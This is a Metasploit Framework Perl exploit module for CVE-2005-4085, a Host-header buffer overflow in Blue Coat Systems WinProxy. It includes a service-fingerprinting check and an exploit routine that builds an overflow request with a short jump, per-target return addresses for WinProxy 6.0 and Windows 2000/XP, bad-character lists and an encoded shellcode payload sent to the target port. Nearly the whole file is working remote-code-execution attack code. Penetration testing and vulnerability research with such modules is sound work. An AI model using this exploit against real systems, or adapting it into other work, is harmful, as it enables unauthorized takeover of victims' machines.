
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::bluecoat_winproxy;
use base "Msf::Exploit";
use strict;
use Pex::Text;

my $advanced = { };

my $info =
  {

	'Name'  => 'Blue Coat Systems WinProxy Host Header Buffer Overflow',
	'Version'  => '$Revision: 1.1 $',
	'Authors' => [ 'y0 [at] w00t-shell.net', ],
	'Arch'  => [ 'x86' ],
	'OS'    => [ 'win32', 'winnt', 'win2000', 'winxp', 'win2003' ],
	'Priv'  => 0,
	'UserOpts'  =>
	  {
		'RHOST' => [1, 'ADDR', 'The target address'],
		'RPORT' => [1, 'PORT', 'The target port', 80],
		'SSL'   => [0, 'BOOL', 'Use SSL'],
	  },
	'AutoOpts' => { 'EXITFUNC' => 'thread' },
	'Payload' =>
	  {
		'Space'     => 600,
		'BadChars'  => "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c",
		'Prepend'   => "\x81\xc4\xff\xef\xff\xff\x44",
		'Keys'      => ['+ws2ord'],
	  },

	'Description'  => Pex::Text::Freeform(qq{
		This module exploits a buffer overflow in Blue Coat Systems WinProxy
	HTTP proxy service. This flaw is triggered when the service processes
	a HTTP request that has a long string specified as the HTTP port.
		
}),

	'Refs'  =>
	  [
		['URL', 'http://www.idefense.com/intelligence/vulnerabilities/display.php?id=364'],
		['CVE', '2005-4085'],
	  ],

	'Targets' =>
	  [
		['WinProxy 6.0 R1c Universal',     0x6020ba04], # Asmdat.dll
		['Windows 2000 Pro English ALL',   0x75022ac4], # ws2help.dll
		['Windows XP Pro SP0/SP1 English', 0x71aa32ad], # ws2help.dll
	  ],

	'Keys' => ['winproxy'],

	'DisclosureDate' => 'January 5 2005',
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

sub Check {
	my ($self) = @_;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');

	my $getreq =
	  "GET / HTTP/1.1". "\r\n".
	  "Host: 127.0.0.1". "\r\n\r\n";

	my $s = Msf::Socket::Tcp->new
	  (
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
		'LocalPort' => $self->GetVar('CPORT'),
		'SSL'       => $self->GetVar('SSL'),
	  );
	if ($s->IsError) {
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return $self->CheckCode('Connect');
	}

	$s->Send($getreq);
	my $res = $s->Recv(-1, 10);
	$s->Close();

	if ($res !~ /BlueCoat-WinProxy/)
	{
		$self->PrintLine("[*] BlueCoat-WinProxy is not running =(");
		return $self->CheckCode('Safe');
	}

	$self->PrintLine("[*] BlueCoat-WinProxy is running!");
	return $self->CheckCode('Detected');
}

sub Exploit
{
	my $self = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');
	my $target_idx  = $self->GetVar('TARGET');
	my $shellcode   = $self->GetVar('EncodedPayload')->Payload;
	my $target = $self->Targets->[$target_idx];

	if (! $self->InitNops(128)) {
		$self->PrintLine("[*] Failed to initialize the nop module.");
		return;
	}

	my $sploit =
	  "GET / HTTP/1.1". "\r\n".
	  "Host: 127.0.0.1:". Pex::Text::AlphaNumText(23).
	  "\xeb\x06\x92\x46". pack('V', $target->[1]).
	  $shellcode. "\r\n\r\n".

	  $self->PrintLine(sprintf("[*] Trying to exploit target %s 0x%.8x", $target->[0], $target->[1]));

	my $s = Msf::Socket::Tcp->new
	  (
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
		'LocalPort' => $self->GetVar('CPORT'),
		'SSL'       => $self->GetVar('SSL'),
	  );
	if ($s->IsError) {
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return;
	}

	$s->Send($sploit);
	$self->Handler($s);
	$s->Close();
	return;
}

1;
